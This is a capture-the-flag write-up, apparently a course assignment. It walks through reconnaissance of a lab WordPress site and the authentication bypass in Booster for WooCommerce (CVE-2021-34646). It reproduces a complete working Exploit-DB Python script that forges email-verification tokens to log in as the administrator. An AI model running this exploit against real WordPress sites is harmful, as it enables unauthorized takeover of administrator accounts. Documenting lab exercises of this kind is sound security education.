# CTF 1 - Wordpress CVE

## 1. Reconnaissance

We were told that at http://ctf-fsi.fe.up.pt:5001 was a Wordpress server. We started by collecting every single bit of information we could about the web application; by taking a closer look at the website's pages, we were able to find the Wordpress and plugins versions.

|![additional-information](images/wordpress-ctf/version_info.png)|
|:--:| 
| *Having this information in public display represents a security risk* |

There was also some information about potential usernames.

![users](images/wordpress-ctf/users.png)

We then tried to login into the *admin* account using a random password to see how the website would respond.

![admin-login-attempt](images/wordpress-ctf/login.png)

As expected, we weren't able to enter the account; however, the website did confirm to us that an account with the *admin* username exists.

![login-error](images/wordpress-ctf/error.png)

## 2. Searching for/Choosing a Vulnerability

With the knowledge acquired in the previous step, we started looking for CVEs associated with the plugins and their respective versions. 
After some research, we found a promising one — CVE-2021-34646 targets the Booster for WooCommerce versions up to 5.4.3, taking advantage of an authentication bypass vulnerability via the email verification feature. This looked to be in line with what we had discovered in the first step. 
We checked that this was in fact the correct CVE by entering ***flag[CVE-2021-34646]***, completing the first part of the challenge.

## 3. Finding an Exploit 

After acknowledging the CVE, we needed to find an exploit that allowed us to explore this vulnerability. We ended up finding it on [Exploit Database](https://www.exploit-db.com/exploits/50299).

```python
    # Exploit Title: WordPress Plugin WooCommerce Booster Plugin 5.4.3 - Authentication Bypass
    # Date: 2021-09-16
    # Exploit Author: Sebastian Kriesten (0xB455)
    # Contact: https://twitter.com/0xB455
    #
    # Affected Plugin: Booster for WooCommerce
    # Plugin Slug: woocommerce-jetpack
    # Vulnerability disclosure: https://www.wordfence.com/blog/2021/08/     critical=-authentication-bypass-vulnerability-patched-in-booster-for-woocommerce/
    # Affected Versions: <= 5.4.3
    # Fully Patched Version: >= 5.4.4
    # CVE: CVE-2021-34646
    # CVSS Score: 9.8 (Critical)
    # Category: webapps
    #
    # 1:
    # Goto: https://target.com/wp-json/wp/v2/users/
    # Pick a user-ID (e.g. 1 - usualy is the admin)
    #
    # 2:
    # Attack with: ./exploit_CVE-2021-34646.py https://target.com/ 1
    #
    # 3:
    # Check-Out  out which of the generated links allows you to access the system
    #
    import requests,sys,hashlib
    import argparse
    import datetime
    import email.utils
    import calendar
    import base64

    B = "\033[94m"
    W = "\033[97m"
    R = "\033[91m"
    RST = "\033[0;0m"

    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="the base url")
    parser.add_argument('id', type=int, help='the user id', default=1)
    args = parser.parse_args()
    id = str(args.id)
    url = args.url
    if args.url[-1] != "/": # URL needs trailing /
            url = url + "/"

    verify_url= url + "?wcj_user_id=" + id
    r = requests.get(verify_url)

    if r.status_code != 200:
            print("status code != 200")
            print(r.headers)
            sys.exit(-1)

    def email_time_to_timestamp(s):
        tt = email.utils.parsedate_tz(s)
        if tt is None: return None
        return calendar.timegm(tt) - tt[9]

    date = r.headers["Date"]
    unix = email_time_to_timestamp(date)

    def printBanner():
        print(f"{W}Timestamp: {B}" + date)
        print(f"{W}Timestamp (unix): {B}" + str(unix) + f"{W}\n")
        print("We need to generate multiple timestamps in order to avoid delay related timing errors")
        print("One of the following links will log you in...\n")

    printBanner()

    for i in range(3): # We need to try multiple timestamps as we don't get the exact hash time and need to avoid delay related timing errors
            hash = hashlib.md5(str(unix-i).encode()).hexdigest()
            print(f"{W}#" + str(i) + f" link for hash {R}"+hash+f"{W}:")
            token='{"id":"'+ id +'","code":"'+hash+'"}'
            token = base64.b64encode(token.encode()).decode()
            token = token.rstrip("=") # remove trailing =
            link = url+"my-account/?wcj_verify_email="+token
            print(link + f"\n{RST}")
```
## 4. Exploring the Vulnerability

The first task was to access http://ctf-fsi.fe.up.pt:5001/wp-json/wp/v2/users/ and find out what the *admin* user id was — as expected, it was 1. 

![iduser](images/wordpress-ctf/iduser.png)

Before running the exploit, however, we had to ask for a password reset on the *admin* account.

![resetpassword](images/wordpress-ctf/resetpassword.png)

We then ran the following command:

```bash
    $ python3 exploit.py http://ctf-fsi.fe.up.pt:5001 1
```

As a result of running the program, we obtained three links.

![links](images/wordpress-ctf/links.png)

By using one of them, we were finally able to login as an administrator.

![loginadmin](images/wordpress-ctf/loginadmin.png)

To conclude the task, we only had to access the [page in the class notes](http://ctf-fsi.fe.up.pt:5001/wp-admin/edit.php) and capture the flag in there — ***flag{please don't bother me}***.  

![message](images/wordpress-ctf/message.png)


